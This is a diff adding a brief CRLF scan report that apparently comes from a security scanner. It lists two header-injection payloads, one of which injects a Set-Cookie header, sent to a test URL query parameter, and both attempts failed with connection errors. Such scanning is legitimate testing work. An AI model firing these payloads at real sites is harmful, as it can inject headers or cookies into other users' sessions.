@@ -1,0 +1,11 @@
+CRLF Scan Report
+Target: https://crlftest.com/?q=
+
+Payload: %0d%0aX-Test: injected
+Status: ERROR: Cannot connect to host crlftest.com:443 ssl:default [Name or service not known]
+Headers: {}
+
+Payload: %0d%0aSet-Cookie: hacker=owned
+Status: ERROR: Cannot connect to host crlftest.com:443 ssl:default [Name or service not known]
+Headers: {}
+
